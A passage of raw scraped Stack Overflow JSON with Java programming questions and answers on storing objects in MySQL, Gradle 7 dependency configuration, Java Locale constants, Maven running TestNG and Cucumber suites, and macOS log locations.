Look into ORM or OODBMS. <a href=\"http://en.wikipedia.org/wiki/Object-relational_mapping\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Object-relational_mapping</a> and <a href=\"http://en.wikipedia.org/wiki/Object_database\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Object_database</a>"}],"answers":[{"tags":[],"owner":{"account_id":16878,"reputation":306143,"user_id":37213,"accept_rate":81,"display_name":"duffymo"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1272656766,"creation_date":1272656766,"answer_id":2747218,"question_id":2747203,"body_markdown":"BLOB could do it.  Serialize the object into a byte array and INSERT that as a BLOB.","title":"Want to store Object in MySQL database","body":"<p>BLOB could do it.  Serialize the object into a byte array and INSERT that as a BLOB.</p>\n"},{"tags":[],"owner":{"account_id":120076,"reputation":39015,"user_id":312260,"accept_rate":87,"display_name":"Mitch Dempsey"},"down_vote_count":0,"up_vote_count":6,"is_accepted":true,"score":6,"last_activity_date":1272656793,"creation_date":1272656793,"answer_id":2747225,"question_id":2747203,"body_markdown":"You can use a `BLOB` to store the raw data, but otherwise no, MySQL does not have a datatype specifically for a java object.\r\n\r\nAs a side note: You probably shouldn&#39;t be storing a raw object into the database, that kind of prevents you from doing any sort of queries on it.","title":"Want to store Object in MySQL database","body":"<p>You can use a <code>BLOB</code> to store the raw data, but otherwise no, MySQL does not have a datatype specifically for a java object.</p>\n\n<p>As a side note: You probably shouldn't be storing a raw object into the database, that kind of prevents you from doing any sort of queries on it.</p>\n"},{"tags":[],"owner":{"account_id":110120,"reputation":4781,"user_id":291538,"accept_rate":91,"display_name":"rompetroll"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1272657836,"creation_date":1272657836,"answer_id":2747330,"question_id":2747203,"body_markdown":"You must serialize the Object anyway, so you could serialize to XML or JSON aswell. A human readable storage form is what I would prefer.\r\nHave a look at [Xstream][1] for example. A great, threadsafe tool for marshalling/unmarshalling. \r\n\r\nI assume of course, that your Object is a Bean/POJO.\r\n\r\n\r\n  [1]: http://xstream.codehaus.org/","title":"Want to store Object in MySQL database","body":"<p>You must serialize the Object anyway, so you could serialize to XML or JSON aswell. A human readable storage form is what I would prefer.\nHave a look at <a href=\"http://xstream.codehaus.org/\" rel=\"nofollow noreferrer\">Xstream</a> for example. A great, threadsafe tool for marshalling/unmarshalling. </p>\n\n<p>I assume of course, that your Object is a Bean/POJO.</p>\n"},{"tags":[],"owner":{"account_id":17405756,"reputation":43,"user_id":12613863,"display_name":"Sarl sbeer"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640264483,"creation_date":1640096452,"answer_id":70436942,"question_id":2747203,"body_markdown":"I&#39;m not sure what do you mean by `Object(java.lang.Object)`. but I think if you tried JSON datatype in MySQL it&#39;ll work fine.\r\n\r\n```sql\r\ncreate table person (name JSON );\r\nINSERT INTO person VALUES (&#39;{&quot;pid&quot;: 101, &quot;name&quot;: &quot;name1&quot;}&#39;);\r\nINSERT INTO person VALUES (&#39;{&quot;pid&quot;: 102, &quot;name&quot;: &quot;name2&quot;}&#39;);\r\n```\r\nor\r\n```sql\r\nINSERT INTO person VALUES (JSON_OBJECT(&quot;pid&quot;,103,&quot;name&quot;, &quot;name3&quot;));\r\n```","title":"Want to store Object in MySQL database","body":"<p>I'm not sure what do you mean by <code>Object(java.lang.Object)</code>. but I think if you tried JSON datatype in MySQL it'll work fine.</p>\n<pre class=\"lang-sql prettyprint-override\"><code>create table person (name JSON );\nINSERT INTO person VALUES ('{&quot;pid&quot;: 101, &quot;name&quot;: &quot;name1&quot;}');\nINSERT INTO person VALUES ('{&quot;pid&quot;: 102, &quot;name&quot;: &quot;name2&quot;}');\n</code></pre>\n<p>or</p>\n<pre class=\"lang-sql prettyprint-override\"><code>INSERT INTO person VALUES (JSON_OBJECT(&quot;pid&quot;,103,&quot;name&quot;, &quot;name3&quot;));\n</code></pre>\n"}],"owner":{"account_id":117025,"reputation":5019,"user_id":306643,"accept_rate":76,"display_name":"kandarp"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":18395,"favorite_count":0,"down_vote_count":0,"up_vote_count":7,"accepted_answer_id":2747225,"answer_count":4,"score":7,"last_activity_date":1640264483,"creation_date":1272656657,"question_id":2747203,"body_markdown":"I have a variable in java which return type is Object(java.lang.Object). I want to store this variable value in MySQL database without casting in any other primitive data type. Is there any data type available in MySQL related to Object? \r\n\r\n","title":"Want to store Object in MySQL database","body":"<p>I have a variable in java which return type is Object(java.lang.Object). I want to store this variable value in MySQL database without casting in any other primitive data type. Is there any data type available in MySQL related to Object? </p>\n"},{"tags":["java","spring","spring-boot","gradle","build.gradle"],"comments":[{"owner":{"account_id":9074935,"reputation":1264,"user_id":6756858,"display_name":"ata"},"score":1,"creation_date":1640256179,"post_id":70460980,"comment_id":124553777,"body_markdown":"Can you post your `build.gradle` file?","body":"Can you post your <code>build.gradle</code> file?"},{"owner":{"account_id":9074935,"reputation":1264,"user_id":6756858,"display_name":"ata"},"score":0,"creation_date":1640256214,"post_id":70460980,"comment_id":124553787,"body_markdown":"And also this one might help you https://stackoverflow.com/questions/48847951/package-org-springframework-boot-does-not-exist","body":"And also this one might help you <a href=\"https://stackoverflow.com/questions/48847951/package-org-springframework-boot-does-not-exist\" title=\"package org springframework boot does not exist\">stackoverflow.com/questions/48847951/&hellip;</a>"}],"answers":[{"tags":[],"owner":{"account_id":402561,"reputation":543,"user_id":769803,"display_name":"shachar"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640264463,"creation_date":1640264463,"answer_id":70462474,"question_id":70460980,"body_markdown":"I think you have an issue with transitivity , if you use java-library instead of java plugin  \r\n\r\n    plugins {\r\n       id &#39;java-library&#39;\r\n    }\r\nhttps://docs.gradle.org/current/userguide/java_library_plugin.html#java_library_plugin &lt;br&gt;\r\nthen you can use the *api* instead of *compile* which can help &lt;br&gt;\r\nyou can see a good explanation  https://stackoverflow.com/questions/44493378/whats-the-difference-between-implementation-api-and-compile-in-gradle\r\n","title":"How to solve error: package org.springframework.context.annotation does not exist import org.springframework.context.annotation.Bean?","body":"<p>I think you have an issue with transitivity , if you use java-library instead of java plugin</p>\n<pre><code>plugins {\n   id 'java-library'\n}\n</code></pre>\n<p><a href=\"https://docs.gradle.org/current/userguide/java_library_plugin.html#java_library_plugin\" rel=\"nofollow noreferrer\">https://docs.gradle.org/current/userguide/java_library_plugin.html#java_library_plugin</a> <br>\nthen you can use the <em>api</em> instead of <em>compile</em> which can help <br>\nyou can see a good explanation  <a href=\"https://stackoverflow.com/questions/44493378/whats-the-difference-between-implementation-api-and-compile-in-gradle\">What&#39;s the difference between implementation, api and compile in Gradle?</a></p>\n"}],"owner":{"account_id":10399567,"reputation":1041,"user_id":7668336,"display_name":"Dinu Nicolae"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":3492,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70462474,"answer_count":1,"score":0,"last_activity_date":1640264475,"creation_date":1640256050,"question_id":70460980,"body_markdown":"After updating the gradle wrapper to version 7.3.2 I get the following error when trying to build my spring boot project:\r\n\r\n    error: package org.springframework.context.annotation does not exist\r\n    import org.springframework.context.annotation.Bean;\r\n\r\nWhy is this happening?\r\n\r\nUpdate:\r\nFound the problem, but do not know how to fix yet.\r\nI have multiple modules in my project. I have a &quot;common&quot; module which is used by other modules. With the old gradle version the libs of the common project were added to the compileClasspath of other modules, with the new version it adds them only to the runtimeClasspath. \r\n\r\nThe dependencies used to be declared as compile, now with gradle 7+ I had to change them to implementation. \r\n\r\nAny suggestions? \r\n\r\nIn other module:\r\n\r\n        dependencies {\r\n            implementation project(&#39;:common&#39;)\r\n    ...\r\n        }\r\n\r\nIn common module:\r\n\r\n    dependencies {\r\n        implementation spring.web\r\n    ...\r\n    }","title":"How to solve error: package org.springframework.context.annotation does not exist import org.springframework.context.annotation.Bean?","body":"<p>After updating the gradle wrapper to version 7.3.2 I get the following error when trying to build my spring boot project:</p>\n<pre><code>error: package org.springframework.context.annotation does not exist\nimport org.springframework.context.annotation.Bean;\n</code></pre>\n<p>Why is this happening?</p>\n<p>Update:\nFound the problem, but do not know how to fix yet.\nI have multiple modules in my project. I have a &quot;common&quot; module which is used by other modules. With the old gradle version the libs of the common project were added to the compileClasspath of other modules, with the new version it adds them only to the runtimeClasspath.</p>\n<p>The dependencies used to be declared as compile, now with gradle 7+ I had to change them to implementation.</p>\n<p>Any suggestions?</p>\n<p>In other module:</p>\n<pre><code>    dependencies {\n        implementation project(':common')\n...\n    }\n</code></pre>\n<p>In common module:</p>\n<pre><code>dependencies {\n    implementation spring.web\n...\n}\n</code></pre>\n"},{"tags":["java","locale"],"comments":[{"owner":{"account_id":2264130,"reputation":38897,"user_id":1993366,"accept_rate":86,"display_name":"vikingsteve"},"score":5,"creation_date":1415357019,"post_id":26799378,"comment_id":42172517,"body_markdown":"You can always make your own constant ;)","body":"You can always make your own constant ;)"},{"owner":{"account_id":1393384,"reputation":6371,"user_id":1770601,"accept_rate":59,"display_name":"ha9u63a7"},"score":0,"creation_date":1415357502,"post_id":26799378,"comment_id":42172786,"body_markdown":"When you say constant, what do you mean? The Locale attributes in java.util.Locale are static, but not constant. What is the constant bit that you are referring to?","body":"When you say constant, what do you mean? The Locale attributes in java.util.Locale are static, but not constant. What is the constant bit that you are referring to?"},{"owner":{"account_id":1528364,"reputation":125594,"user_id":1426227,"accept_rate":79,"display_name":"cassiomolin"},"score":0,"creation_date":1415357951,"post_id":26799378,"comment_id":42173035,"body_markdown":"Constant means `(public/private) static final TYPE NAME = VALUE;`. `Locale.ITALY`, for example, is documented as &quot;Useful constant for country&quot;.","body":"Constant means <code>(public&#47;private) static final TYPE NAME = VALUE;</code>. <code>Locale.ITALY</code>, for example, is documented as &quot;Useful constant for country&quot;."}],"answers":[{"tags":[],"owner":{"account_id":47283,"reputation":703817,"user_id":139985,"accept_rate":69,"display_name":"Stephen C"},"down_vote_count":0,"up_vote_count":7,"is_accepted":true,"score":7,"last_activity_date":1640264182,"creation_date":1415358646,"answer_id":26799948,"question_id":26799378,"body_markdown":"&gt; Why only some locales as constants?\r\n\r\nThe javadoc for `Locale` says this about the constants:\r\n\r\n&gt; *&quot;The Locale class provides a number of convenient constants that you can use to create Locale objects for commonly used locales.&quot;*\r\n\r\nThe obvious implication is that `Locale` constants have not been defined for other countries and languages because the locales were thought at the time to be &quot;less commonly used&quot; in Java programs.  Or at least, not common enough to warrant adding the corresponding constants.  (I have no idea if this decision was made based on objective evidence or not.)\r\n\r\nBe aware that there would be performance overheads in adding lots more `Locale` constants.  Not to mention all sorts of compatibility issues due to countries changing names, etcetera.  So, basically, they had to stop somewhere ... and the current set is where they stopped.\r\n\r\nThe other thing to note is that these constants are *merely* a convenience; i.e. a simple way to get Locale objects that you can always get by other means; e.g. by using a `Locale` constructor, or by calling `Locale.lookup(...)`.\r\n\r\n&gt;  Is there a Java library which provide constants for locales?\r\n\r\nAFAIK, no.  And it seems to me like a bad idea, for the reasons above.\r\n\r\nAnd, of course, you can always define your own class containing Locale constants that are convenient for *your* applications.\r\n\r\n-----------------------------\r\n\r\nFor the record, I found an RFE in the Java Bug Database (in the Google cache) that relates to this:\r\n\r\n&gt; *JDK-4399080 : RFE: java.util.Locale.SPANISH and java.util.Locale.SPAIN does not exist*\r\n\r\nThis RFE was reported against Java 1.3.0, and was closed as &quot;Won&#39;t Fix&quot; with the following Evaluation:\r\n\r\n&gt; *We decided a while ago not to add more predefined locale constants. It&#39;s easy enough to write `new Locale(&quot;es&quot;);` or `new Locale(&quot;es&quot;, &quot;ES&quot;);` so there&#39;s no real benefit in adding more constants - especially since it&#39;s not feasible to cover all languages and countries.*\r\n&gt;\r\n&gt; *norbert.lindenberg@Eng 2001-01-05*","title":"Why Java locales are not constants?","body":"<blockquote>\n<p>Why only some locales as constants?</p>\n</blockquote>\n<p>The javadoc for <code>Locale</code> says this about the constants:</p>\n<blockquote>\n<p><em>&quot;The Locale class provides a number of convenient constants that you can use to create Locale objects for commonly used locales.&quot;</em></p>\n</blockquote>\n<p>The obvious implication is that <code>Locale</code> constants have not been defined for other countries and languages because the locales were thought at the time to be &quot;less commonly used&quot; in Java programs.  Or at least, not common enough to warrant adding the corresponding constants.  (I have no idea if this decision was made based on objective evidence or not.)</p>\n<p>Be aware that there would be performance overheads in adding lots more <code>Locale</code> constants.  Not to mention all sorts of compatibility issues due to countries changing names, etcetera.  So, basically, they had to stop somewhere ... and the current set is where they stopped.</p>\n<p>The other thing to note is that these constants are <em>merely</em> a convenience; i.e. a simple way to get Locale objects that you can always get by other means; e.g. by using a <code>Locale</code> constructor, or by calling <code>Locale.lookup(...)</code>.</p>\n<blockquote>\n<p>Is there a Java library which provide constants for locales?</p>\n</blockquote>\n<p>AFAIK, no.  And it seems to me like a bad idea, for the reasons above.</p>\n<p>And, of course, you can always define your own class containing Locale constants that are convenient for <em>your</em> applications.</p>\n<hr />\n<p>For the record, I found an RFE in the Java Bug Database (in the Google cache) that relates to this:</p>\n<blockquote>\n<p><em>JDK-4399080 : RFE: java.util.Locale.SPANISH and java.util.Locale.SPAIN does not exist</em></p>\n</blockquote>\n<p>This RFE was reported against Java 1.3.0, and was closed as &quot;Won't Fix&quot; with the following Evaluation:</p>\n<blockquote>\n<p><em>We decided a while ago not to add more predefined locale constants. It's easy enough to write <code>new Locale(&quot;es&quot;);</code> or <code>new Locale(&quot;es&quot;, &quot;ES&quot;);</code> so there's no real benefit in adding more constants - especially since it's not feasible to cover all languages and countries.</em></p>\n<p><em>norbert.lindenberg@Eng 2001-01-05</em></p>\n</blockquote>\n"},{"tags":[],"owner":{"account_id":5150443,"reputation":34158,"user_id":4125191,"display_name":"RealSkeptic"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1415359248,"creation_date":1415359248,"answer_id":26800123,"question_id":26799378,"body_markdown":"Although &quot;why&quot; questions are open-ended, I think it&#39;s safe to say that the constants probably exist only for backward compatibility. Here is [Oracle&#39;s article about Internationalization, specifically, the pre-constructed locales](http://www.oracle.com/technetwork/articles/javase/locale-140624.html?ssSourceSiteId=ocomen#preconstructed).\r\n\r\nAs you can see, the author freely admits that the provided constants do not cover all the &quot;Important&quot; countries (from whatever perspective that may be), and that they shouldn&#39;t be used at all.\r\n\r\nThe constants today are the same as they were in JDK 1.1, so I believe they are kept only for backward compatibility.","title":"Why Java locales are not constants?","body":"<p>Although \"why\" questions are open-ended, I think it's safe to say that the constants probably exist only for backward compatibility. Here is <a href=\"http://www.oracle.com/technetwork/articles/javase/locale-140624.html?ssSourceSiteId=ocomen#preconstructed\" rel=\"nofollow\">Oracle's article about Internationalization, specifically, the pre-constructed locales</a>.</p>\n\n<p>As you can see, the author freely admits that the provided constants do not cover all the \"Important\" countries (from whatever perspective that may be), and that they shouldn't be used at all.</p>\n\n<p>The constants today are the same as they were in JDK 1.1, so I believe they are kept only for backward compatibility.</p>\n"},{"tags":[],"owner":{"account_id":910393,"reputation":1619,"user_id":1384748,"display_name":"Breand&#225;n Dalton"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1415370266,"creation_date":1415370266,"answer_id":26803360,"question_id":26799378,"body_markdown":"`Why only some locales as constants?`\r\n\r\nIt was really a mistake to make any locales constants (as RealSkeptic&#39;s answer shows). Countries are not constant. They come and go, and what was once a country may end up consigned to the history books and no longer commonly used (e.g. recently USSR, Yugoslavia). It would be a mistake to have a convenient Locale constant for a country that no longer exists.\r\n\r\nYou may say, &quot;well so what, let&#39;s just put all countries in as constants, and if they cease to exist, where&#39;s the harm&quot;? The problem there is that new countries also come into existence all the time (e.g. East Timor, Kosovo). Either new constants have to be continually added to the list, which would bring its own compatibility issues, or the constant list would remain (as it is now) frozen in time, representing only countries that existed when JDK 1.1 came out.","title":"Why Java locales are not constants?","body":"<p><code>Why only some locales as constants?</code></p>\n\n<p>It was really a mistake to make any locales constants (as RealSkeptic's answer shows). Countries are not constant. They come and go, and what was once a country may end up consigned to the history books and no longer commonly used (e.g. recently USSR, Yugoslavia). It would be a mistake to have a convenient Locale constant for a country that no longer exists.</p>\n\n<p>You may say, \"well so what, let's just put all countries in as constants, and if they cease to exist, where's the harm\"? The problem there is that new countries also come into existence all the time (e.g. East Timor, Kosovo). Either new constants have to be continually added to the list, which would bring its own compatibility issues, or the constant list would remain (as it is now) frozen in time, representing only countries that existed when JDK 1.1 came out.</p>\n"},{"tags":[],"owner":{"account_id":449256,"reputation":2122,"user_id":843943,"accept_rate":75,"display_name":"Grim"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1447668208,"creation_date":1447668208,"answer_id":33732668,"question_id":26799378,"body_markdown":"Because Locales are not constant. Remember the episode of family guy where Peter founded the Country &quot;Petoria&quot;?\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/sa7Cq.jpg","title":"Why Java locales are not constants?","body":"<p>Because Locales are not constant. Remember the episode of family guy where Peter founded the Country \"Petoria\"?</p>\n\n<p><a href=\"https://i.stack.imgur.com/sa7Cq.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/sa7Cq.jpg\" alt=\"enter image description here\"></a></p>\n"}],"owner":{"account_id":1528364,"reputation":125594,"user_id":1426227,"accept_rate":79,"display_name":"cassiomolin"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":2434,"favorite_count":0,"down_vote_count":0,"up_vote_count":8,"accepted_answer_id":26799948,"answer_count":4,"score":8,"last_activity_date":1640264182,"creation_date":1415356935,"question_id":26799378,"body_markdown":"Java supports the [`Locale`][1]s shown in this [link][2].  \r\n\r\nBut I can&#39;t figure out why only some countries such as France, Canada, China and United States and some languages such as Italian, Japanese and German have constants for their locales.  \r\n\r\nEverytime a need a locale, I consult the table of supported locales and do the following, using Strings:\r\n\r\n    Locale locale = new Locale(&quot;pt&quot;, &quot;BR&quot;);\r\n\r\nWhy only some locales as constants?  \r\nIs there a Java library which provide constants for locales?\r\n\r\n[1]: http://docs.oracle.com/javase/8/docs/api/java/util/Locale.html\r\n[2]: http://www.oracle.com/technetwork/java/javase/java8locales-2095355.html\r\n","title":"Why Java locales are not constants?","body":"<p>Java supports the <a href=\"http://docs.oracle.com/javase/8/docs/api/java/util/Locale.html\" rel=\"noreferrer\"><code>Locale</code></a>s shown in this <a href=\"http://www.oracle.com/technetwork/java/javase/java8locales-2095355.html\" rel=\"noreferrer\">link</a>.  </p>\n\n<p>But I can't figure out why only some countries such as France, Canada, China and United States and some languages such as Italian, Japanese and German have constants for their locales.  </p>\n\n<p>Everytime a need a locale, I consult the table of supported locales and do the following, using Strings:</p>\n\n<pre><code>Locale locale = new Locale(\"pt\", \"BR\");\n</code></pre>\n\n<p>Why only some locales as constants?<br>\nIs there a Java library which provide constants for locales?</p>\n"},{"tags":["java","maven","testng","cucumber-java","testng.xml"],"answers":[{"tags":[],"owner":{"account_id":15818590,"reputation":73,"user_id":11413535,"display_name":"Adarsh"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640264131,"creation_date":1640263513,"answer_id":70462316,"question_id":70462126,"body_markdown":"Below code was disabled in my pom.xml file-\r\n```\r\n                   &lt;suiteXmlFiles&gt;\r\n                        &lt;!--suppress UnresolvedMavenProperty --&gt;\r\n                        &lt;suiteXmlFile&gt;${suiteXmlFile}&lt;/suiteXmlFile&gt;\r\n                    &lt;/suiteXmlFiles&gt;\r\n```\r\n\r\nThe above dependency enabled me to execute the testNG.xml file via command-```mvn clean test -DsuiteXmlFile=src/test/java/com/suite/sanityTestSuite.xml -Denvironment=uat```, \r\nhowever this command doesn&#39;t work-\r\n```mvn test -Dcucumber.options=&quot;src/test/java/com/suite/sanityTestSuite.xml&quot;```\r\n -Dcucumber.filter.tags=&quot;@Sanity&quot; -Denvironment=qa","title":"maven not executing my cucumber testRunner class or assocaited feature files","body":"<p>Below code was disabled in my pom.xml file-</p>\n<pre><code>                   &lt;suiteXmlFiles&gt;\n                        &lt;!--suppress UnresolvedMavenProperty --&gt;\n                        &lt;suiteXmlFile&gt;${suiteXmlFile}&lt;/suiteXmlFile&gt;\n                    &lt;/suiteXmlFiles&gt;\n</code></pre>\n<p>The above dependency enabled me to execute the testNG.xml file via command-<code>mvn clean test -DsuiteXmlFile=src/test/java/com/suite/sanityTestSuite.xml -Denvironment=uat</code>,\nhowever this command doesn't work-\n<code>mvn test -Dcucumber.options=&quot;src/test/java/com/suite/sanityTestSuite.xml&quot;</code>\n-Dcucumber.filter.tags=&quot;@Sanity&quot; -Denvironment=qa</p>\n"}],"owner":{"account_id":15818590,"reputation":73,"user_id":11413535,"display_name":"Adarsh"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":518,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640264131,"creation_date":1640262278,"question_id":70462126,"body_markdown":"I am trying to execute a testNg.xml test suite that in turn executes a cucumber test runner class via maven and not tests are triggered. \r\nIf I execute the testNG.xml directly from intelliJ, it works.\r\nIf I execute the feature file or testRunner, it works.\r\n\r\nmy testNG.xml file - sanityTestSuite.xml\r\n```\r\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\r\n&lt;!DOCTYPE suite SYSTEM &quot;https://testng.org/testng-1.0.dtd&quot;&gt;\r\n&lt;suite name=&quot;My UI Sanity Test Features&quot;&gt;\r\n\r\n    &lt;test verbose=&quot;2&quot; preserve-order=&quot;true&quot; name=&quot;Sanity tests&quot;&gt;\r\n\r\n        &lt;classes&gt;\r\n            &lt;class name=&quot;com.runner.SanityTestRunner&quot;&gt;\r\n                &lt;!-- &lt;methods&gt;&lt;include name=&quot;test1&quot;/&gt;&lt;/methods&gt; --&gt;\r\n            &lt;/class&gt;\r\n            \r\n        &lt;/classes&gt;\r\n    &lt;/test&gt;\r\n&lt;/suite&gt;\r\n```\r\n\r\nmy TestRunner file - SanityTestRunner\r\n```\r\npackage com.runner;\r\nimport io.cucumber.testng.AbstractTestNGCucumberTests;\r\nimport io.cucumber.testng.CucumberOptions;\r\n\r\n@CucumberOptions\r\n        (\r\n                features = {&quot;src\\\\test\\\\java\\\\com\\\\features&quot;},\r\n                //features = {&quot;src\\\\test\\\\java\\\\com\\\\features\\\\LoginTest.feature&quot;},\r\n\r\n                glue = {&quot;com.stepDef&quot;},\r\n\r\n                dryRun = false, strict = true, monochrome = true,\r\n\r\n                //Report generator.\r\n                plugin = {  &quot;pretty&quot;, &quot;com.aventstack.extentreports.cucumber.adapter.ExtentCucumberAdapter:&quot;},\r\n\r\n                //Below statement can be used to tag the features that needs to be executed.\r\n                tags = &quot;@Sanity&quot;\r\n\r\n                //Below statement can be used to tag the features that NOT be executed.\r\n                //tags = {&quot;~@SanityTest&quot;}\r\n        )\r\npublic class SanityTestRunner extends AbstractTestNGCucumberTests { }\r\n```\r\nmy feature file - LoginTest.feature\r\n```\r\n@UITests\r\nFeature: Verify basic user functionalities of the amazon portal\r\n\r\n  Background:\r\n    Given user opens the url in the browser\r\n\r\n\r\n  @Sanity\r\n    @userSignInToAmazonPortal\r\n  Scenario Outline: Launch Amazon portal and sign in as admin user.\r\n    Then user validates the loaded home page title as &lt;homePageTitle&gt;\r\n    And user selects Sign In button\r\n    And user validates the loaded sign in page title as &lt;signInPageTitle&gt;\r\n    And user enters the credentials for &lt;userType&gt; user\r\n    Then user Sign in must be successful\r\n\r\n    Examples:\r\n      | userType   |homePageTitle        |signInPageTitle |\r\n      | admin      |Online Shopping site |Amazon Sign In  |\r\n```\r\n\r\nCommands I have used - \r\n```mvn test -Dcucumber.options=&quot;src/test/java/com/features/LoginTest.feature&quot; -Dcucumber.filter.tags=&quot;@Smoke&quot; -Denvironment=qa```\r\n\r\n```mvn test -Dcucumber.options=&quot;src/test/java/com/suite/sanityTestSuite.xml&quot; -Dcucumber.filter.tags=&quot;@Sanity&quot; -Denvironment=qa```\r\n\r\n```mvn test -Dcucumber.options=&quot;--tags @userSignInToAmazonPortal&quot;```\r\n","title":"maven not executing my cucumber testRunner class or assocaited feature files","body":"<p>I am trying to execute a testNg.xml test suite that in turn executes a cucumber test runner class via maven and not tests are triggered.\nIf I execute the testNG.xml directly from intelliJ, it works.\nIf I execute the feature file or testRunner, it works.</p>\n<p>my testNG.xml file - sanityTestSuite.xml</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;!DOCTYPE suite SYSTEM &quot;https://testng.org/testng-1.0.dtd&quot;&gt;\n&lt;suite name=&quot;My UI Sanity Test Features&quot;&gt;\n\n    &lt;test verbose=&quot;2&quot; preserve-order=&quot;true&quot; name=&quot;Sanity tests&quot;&gt;\n\n        &lt;classes&gt;\n            &lt;class name=&quot;com.runner.SanityTestRunner&quot;&gt;\n                &lt;!-- &lt;methods&gt;&lt;include name=&quot;test1&quot;/&gt;&lt;/methods&gt; --&gt;\n            &lt;/class&gt;\n            \n        &lt;/classes&gt;\n    &lt;/test&gt;\n&lt;/suite&gt;\n</code></pre>\n<p>my TestRunner file - SanityTestRunner</p>\n<pre><code>package com.runner;\nimport io.cucumber.testng.AbstractTestNGCucumberTests;\nimport io.cucumber.testng.CucumberOptions;\n\n@CucumberOptions\n        (\n                features = {&quot;src\\\\test\\\\java\\\\com\\\\features&quot;},\n                //features = {&quot;src\\\\test\\\\java\\\\com\\\\features\\\\LoginTest.feature&quot;},\n\n                glue = {&quot;com.stepDef&quot;},\n\n                dryRun = false, strict = true, monochrome = true,\n\n                //Report generator.\n                plugin = {  &quot;pretty&quot;, &quot;com.aventstack.extentreports.cucumber.adapter.ExtentCucumberAdapter:&quot;},\n\n                //Below statement can be used to tag the features that needs to be executed.\n                tags = &quot;@Sanity&quot;\n\n                //Below statement can be used to tag the features that NOT be executed.\n                //tags = {&quot;~@SanityTest&quot;}\n        )\npublic class SanityTestRunner extends AbstractTestNGCucumberTests { }\n</code></pre>\n<p>my feature file - LoginTest.feature</p>\n<pre><code>@UITests\nFeature: Verify basic user functionalities of the amazon portal\n\n  Background:\n    Given user opens the url in the browser\n\n\n  @Sanity\n    @userSignInToAmazonPortal\n  Scenario Outline: Launch Amazon portal and sign in as admin user.\n    Then user validates the loaded home page title as &lt;homePageTitle&gt;\n    And user selects Sign In button\n    And user validates the loaded sign in page title as &lt;signInPageTitle&gt;\n    And user enters the credentials for &lt;userType&gt; user\n    Then user Sign in must be successful\n\n    Examples:\n      | userType   |homePageTitle        |signInPageTitle |\n      | admin      |Online Shopping site |Amazon Sign In  |\n</code></pre>\n<p>Commands I have used -\n<code>mvn test -Dcucumber.options=&quot;src/test/java/com/features/LoginTest.feature&quot; -Dcucumber.filter.tags=&quot;@Smoke&quot; -Denvironment=qa</code></p>\n<p><code>mvn test -Dcucumber.options=&quot;src/test/java/com/suite/sanityTestSuite.xml&quot; -Dcucumber.filter.tags=&quot;@Sanity&quot; -Denvironment=qa</code></p>\n<p><code>mvn test -Dcucumber.options=&quot;--tags @userSignInToAmazonPortal&quot;</code></p>\n"},{"tags":["java","eclipse","spring-boot"],"comments":[{"owner":{"account_id":3330713,"reputation":519,"user_id":2799728,"accept_rate":75,"display_name":"ErikM"},"score":1,"creation_date":1640265760,"post_id":70462386,"comment_id":124556823,"body_markdown":"Do you mean /var/log? This is not java related thing","body":"Do you mean /var/log? This is not java related thing"},{"owner":{"account_id":8762206,"reputation":380,"user_id":6551863,"display_name":"Sharad"},"score":0,"creation_date":1640268809,"post_id":70462386,"comment_id":124557836,"body_markdown":"What kind of logs folder, you are referring to ?","body":"What kind of logs folder, you are referring to ?"},{"owner":{"account_id":23685228,"reputation":1103,"user_id":17710270,"display_name":"passer-by"},"score":1,"creation_date":1640276526,"post_id":70462386,"comment_id":124560559,"body_markdown":"There&#39;s no such directory as C:\\LOGS on a standard Windows 10 system anyway. It must be specific to something you&#39;ve done or you&#39;ve installed.","body":"There&#39;s no such directory as C:\\LOGS on a standard Windows 10 system anyway. It must be specific to something you&#39;ve done or you&#39;ve installed."}],"owner":{"account_id":19435168,"reputation":37,"user_id":14214785,"display_name":"Agung Donga"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":60,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":0,"score":0,"last_activity_date":1640263916,"creation_date":1640263916,"question_id":70462386,"body_markdown":"I&#39;m a new user on mac os\r\ni want to ask, where is the logs folder like in windows C:\\logs but on mac os\r\n\r\nthank you, hope your help is useful","title":"Where is C:\\LOGS file windows but at mac os","body":"<p>I'm a new user on mac os\ni want to ask, where is the logs folder like in windows C:\\logs but on mac os</p>\n<p>thank you, hope your help is useful</p>\n"},{"tags":["java","filesystems"],"comments":[{"owner":{"account_id":481416,"reputation":355324,"user_id":895245,"accept_rate":49,"display_name":"Ciro Santilli OurBigBook.com"},"score":0,"creation_date":1425266054,"post_id":2149785,"comment_id":45877991,"body_markdown":"Same but with focus on efficiency: http://stackoverflow.com/questions/116574/java-get-file-size-efficiently","body":"Same but with focus on efficiency: <a href=\"http://stackoverflow.com/questions/116574/java-get-file-size-efficiently\" title=\"java get file size 